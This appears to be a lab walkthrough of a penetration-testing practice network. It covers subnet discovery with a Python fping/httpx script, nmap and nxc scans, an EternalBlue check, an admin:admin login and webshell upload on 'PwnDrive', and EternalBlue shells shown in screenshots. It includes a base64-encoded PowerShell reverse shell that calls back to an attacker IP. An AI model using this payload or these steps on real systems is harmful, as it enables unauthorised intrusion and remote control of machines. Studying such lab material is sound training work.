![image](https://github.com/user-attachments/assets/cb736774-f012-4142-bf6c-40178f7c68eb)## This note contains pwning from beginning to the end of every targets. 

![image](https://github.com/user-attachments/assets/249c6f61-b546-4373-b86e-49ac71dfa42a)

> first discover targets in the platform ranging from .10 - .254. I have script to look for targets in a subnet or multiple subnet

```python
import subprocess
import concurrent.futures


# List of network ranges to scan
networks = [
   "10.150.150.0/22"]


# Files to write live hosts and web hosts
output_file = "alive_hosts.txt"
web_hosts_file = "web_hosts.txt"


# Function to scan a single network and write results to a file
def scan_network(network):
   try:
       print(f"Scanning network: {network}")
       result = subprocess.run(
           ["fping", "-a", "-g", network],
           stdout=subprocess.PIPE,
           stderr=subprocess.PIPE,
           text=True
       )


       output = result.stdout.strip()
       if output:
           with open(output_file, "a") as f:
               f.write(f"Live hosts in {network}:\n{output}\n\n")
           print(f"Live hosts written to {output_file}")
           return output.splitlines()  # Return live hosts as a list
       else:
           print(f"No live hosts found in {network}")
           return []


   except Exception as e:
       print(f"Error scanning {network}: {e}")
       return []


# Function to run httpx on a single host
def run_httpx(host):
   try:
       print(f"Running httpx on: {host}")
       result = subprocess.run(
           ["httpx", "-title", "-sc", "-cl", host],
           stdout=subprocess.PIPE,
           stderr=subprocess.PIPE,
           text=True
       )


       output = result.stdout.strip()
       if output:
           with open(web_hosts_file, "a") as f:
               f.write(f"Results for {host}:\n{output}\n\n")
           print(f"Results for {host} written to {web_hosts_file}")


   except Exception as e:
       print(f"Error running httpx on {host}: {e}")


# Main function to run the network scan and httpx in parallel
def main():
   with open(output_file, "w") as f:
       f.write("Live Hosts Scan Results:\n\n")


   with open(web_hosts_file, "w") as f:
       f.write("Web Hosts Scan Results:\n\n")


   max_workers = 10  # Number of concurrent workers (threads)


   with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
       futures = [executor.submit(scan_network, network) for network in networks]
       live_hosts = []
       for future in concurrent.futures.as_completed(futures):
           try:
               hosts = future.result()
               live_hosts.extend(hosts)
           except Exception as e:
               print(f"Error: {e}")


   print("Network scan complete. Results saved in", output_file)


   # Run httpx on live hosts in parallel
   if live_hosts:
       with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
           httpx_futures = [executor.submit(run_httpx, host) for host in live_hosts]
           for future in concurrent.futures.as_completed(httpx_futures):
               try:
                   future.result()
               except Exception as e:
                   print(f"Error: {e}")


if __name__ == "__main__":
   main()

```


> Running the script to discover targets

![image](https://github.com/user-attachments/assets/df25bf2a-b4db-4811-950c-35f3c6342b72)

> Using fping to check for targets in the suibnet

```bash
fping -a -g 10.150.150.0/22 2>/dev/null > ips.txt 

┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PTD]
└─$ cat ips.txt 
10.150.150.2
10.150.150.11
10.150.150.12
10.150.150.15
10.150.150.17
10.150.150.18
10.150.150.21
10.150.150.27
10.150.150.38
10.150.150.48
10.150.150.55
10.150.150.56
10.150.150.57
10.150.150.59
10.150.150.66
10.150.150.69
10.150.150.100
10.150.150.113
10.150.150.122
10.150.150.123
10.150.150.129
10.150.150.130
10.150.150.134
10.150.150.135
10.150.150.136
10.150.150.137
10.150.150.138
10.150.150.145
10.150.150.146
10.150.150.147
10.150.150.150
10.150.150.166
10.150.150.178
10.150.150.181
10.150.150.182
10.150.150.188
10.150.150.193
10.150.150.199
10.150.150.202
10.150.150.212
10.150.150.219
10.150.150.222
10.150.150.224
10.150.150.226
10.150.150.232
10.150.150.242
```



> Discovering windows devices using net exec


```bash
nxc smb 10.150.150.0/22
```

![image](https://github.com/user-attachments/assets/96009369-fe6e-4ddb-9bb7-7b567acbef4e)



## Checking for common network smb vulns 

> Checking for targets vuln to eternalblue using net exec 

```bash
nxc smb 10.150.150.0/22 -M ms17-010 2>/dev/null
```

![image](https://github.com/user-attachments/assets/82fa052d-2f3d-4e30-a82e-2fc103d2af6e)

we can see the targets below are vulnerable to eternalblue 

```
10.150.150.11
10.150.150.242
```



# Exploiting targets 

## 10.150.150.11 (pwndrive)

> first enum with nmap, first we do full port scan

```bash
# Nmap 7.94SVN scan initiated Sun May 18 20:47:07 2025 as: /usr/lib/nmap/nmap --privileged -p- --min-rate 1000 -v -Pn -oN 11.txt 10.150.150.11
Nmap scan report for 10.150.150.11
Host is up (0.35s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49192/tcp open  unknown

Read data files from: /usr/share/nmap
# Nmap done at Sun May 18 20:48:33 2025 -- 1 IP address (1 host up) scanned in 85.77 seconds
```


> running nmap default script scans

```bash
# Nmap 7.94SVN scan initiated Sun May 18 20:50:55 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p21,80,135,139,443,445,1433,3306,3389 -Pn -oN 11_service.txt 10.150.150.11
Nmap scan report for 10.150.150.11
Host is up (0.20s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Xlight ftpd 3.9
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
|_ssl-date: TLS randomness does not represent time
|_http-title: PwnDrive - Your Personal Online Storage
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
| ms-sql-ntlm-info: 
|   10.150.150.11:1433: 
|     Target_Name: PWNDRIVE
|     NetBIOS_Domain_Name: PWNDRIVE
|     NetBIOS_Computer_Name: PWNDRIVE
|     DNS_Domain_Name: PwnDrive
|     DNS_Computer_Name: PwnDrive
|_    Product_Version: 6.1.7601
|_ssl-date: 2025-05-18T19:12:47+00:00; -38m33s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-21T12:57:09
|_Not valid after:  2054-03-21T12:57:09
| ms-sql-info: 
|   10.150.150.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3306/tcp open  mysql        MySQL 5.5.5-10.4.14-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.14-MariaDB
|   Thread ID: 587
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, IgnoreSpaceBeforeParenthesis, InteractiveClient, FoundRows, LongColumnFlag, ODBCClient, SupportsLoadDataLocal, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: pw&TS%]%=F&,IhRB4z-m
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  tcpwrapped
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 45m27s, deviation: 3h07m50s, median: -38m33s
| smb2-time: 
|   date: 2025-05-18T19:12:36
|_  start_date: 2024-03-21T12:57:13
|_nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:87:cb (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: PwnDrive
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-18T12:12:37-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 18 20:51:23 2025 -- 1 IP address (1 host up) scanned in 27.70 seconds

```


> enumerating port 80 

![image](https://github.com/user-attachments/assets/a925a723-a008-497c-a305-cf54e6c1b1ea)

we can see the web service is up and running 

![image](https://github.com/user-attachments/assets/744df946-c914-4b33-ba60-78f3f4dbe8ed)

clicked the signin button to login, trying default creds. 


![image](https://github.com/user-attachments/assets/76f5e383-4760-4a21-b5d9-88d590774272)

we loging using `admin:admin` credential. we can see a cmd.php file. 

![image](https://github.com/user-attachments/assets/c144bd7e-2538-4623-b6d7-90095d2f5d7f)

we create a new dir and upload file webshell.php

![image](https://github.com/user-attachments/assets/b4ceb5c9-4cc4-46eb-80a1-63203a002670)

use feroxbuster to discover the path where the shell is uploaded to. 

![image](https://github.com/user-attachments/assets/beb52d8a-adbc-420a-aa54-0f732d138afd)

we got RCE and executed whoami as user `nt authority\system`


![image](https://github.com/user-attachments/assets/3c149b10-d7d2-4a3c-8384-6398d564c85c)

> let's pop reverse shell 


```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgA2AC4ANgA3AC4ANQA4ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

![image](https://github.com/user-attachments/assets/6422adcc-8614-48aa-95ae-a7e9676dca11)

we got a reverse shell as `nt auth/system`.



> exploiting the eternal blue vuln (MS17-010) - T0DO

![image](https://github.com/user-attachments/assets/eefd389b-659f-4fd3-bf1e-3716d5e96c77)

found an exploit on github 

> running the exploit

![image](https://github.com/user-attachments/assets/f6baf65f-6149-4f8e-b93e-7d88b302d1bf)

we got shell as user `nt auth/system`

![image](https://github.com/user-attachments/assets/5c20cb00-ad0d-4655-b507-114a863a17f5)

easy peasy 🙂



# 10.150.150.12 

>first enum with nmap

```bash
# Nmap 7.94SVN scan initiated Sun May 18 21:34:18 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p21,22 -Pn -oN 12_service.txt 10.150.150.12
Nmap scan report for 10.150.150.12
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.66.67.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1f:bc:e3:e3:5b:eb:ff:b2:30:a7:4c:33:11:bf:67:a3 (RSA)
|   256 c8:e4:18:29:59:d0:4e:ea:dc:05:50:bc:d5:6f:e5:00 (ECDSA)
|_  256 58:d5:70:6d:0d:80:71:0a:ba:8e:1c:7a:c7:37:2f:e2 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 18 21:34:36 2025 -- 1 IP address (1 host up) scanned in 17.86 seconds
```

> enum port 21 (ftp)






# 10.150.150.242 (MrBlue)

> first enum with nmap

```bash
# Nmap 7.94SVN scan initiated Mon May 19 11:08:49 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p53,80,135,139,445,1433,3389,8089 -Pn -oN 242_service.txt 10.150.150.242
Nmap scan report for 10.150.150.242
Host is up (0.31s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
80/tcp   open  http         Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
1433/tcp open  ms-sql-s     Microsoft SQL Server 2012 11.00.2100.00; RTM
|_ssl-date: 2025-05-19T09:31:07+00:00; -38m34s from scanner time.
| ms-sql-info: 
|   10.150.150.242:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-03-25T14:11:19
|_Not valid after:  2050-03-25T14:11:19
| ms-sql-ntlm-info: 
|   10.150.150.242:1433: 
|     Target_Name: MRBLUE
|     NetBIOS_Domain_Name: MRBLUE
|     NetBIOS_Computer_Name: MRBLUE
|     DNS_Domain_Name: MrBlue
|     DNS_Computer_Name: MrBlue
|_    Product_Version: 6.1.7601
3389/tcp open  tcpwrapped
|_ssl-date: 2025-05-19T09:31:07+00:00; -38m34s from scanner time.
| ssl-cert: Subject: commonName=MrBlue
| Not valid before: 2025-05-18T07:59:21
|_Not valid after:  2025-11-17T07:59:21
| rdp-ntlm-info: 
|   Target_Name: MRBLUE
|   NetBIOS_Domain_Name: MRBLUE
|   NetBIOS_Computer_Name: MRBLUE
|   DNS_Domain_Name: MrBlue
|   DNS_Computer_Name: MrBlue
|   Product_Version: 6.1.7601
|_  System_Time: 2025-05-19T09:30:54+00:00
8089/tcp open  ssl/http     Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-25T09:53:52
|_Not valid after:  2022-10-24T09:53:52
|_http-title: splunkd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: Host: MRBLUE; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: MrBlue
|   NetBIOS computer name: MRBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-19T09:30:52+00:00
| smb2-time: 
|   date: 2025-05-19T09:30:52
|_  start_date: 2020-03-25T14:11:23
|_clock-skew: mean: -38m34s, deviation: 0s, median: -38m34s
|_nbstat: NetBIOS name: MRBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:ab:46:29 (VMware)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 19 11:09:42 2025 -- 1 IP address (1 host up) scanned in 52.90 seconds

```

remember we found an eternal blue vuln on this target

![image](https://github.com/user-attachments/assets/85cedd19-ddb5-43f5-9b07-797580e4cfe7)

> Exploiting using msfconsole

![image](https://github.com/user-attachments/assets/b6ab0a8c-5cf0-4ef5-9af1-ac9912600d6c)

exploit to get shell

![image](https://github.com/user-attachments/assets/2c5ea0fb-8dd7-4788-a907-73a9a30d2069)

cool we pwned it 😃


![image](https://github.com/user-attachments/assets/4fb96362-2c30-4779-a02b-7521f3cdb76b)

Easy peasy 😸
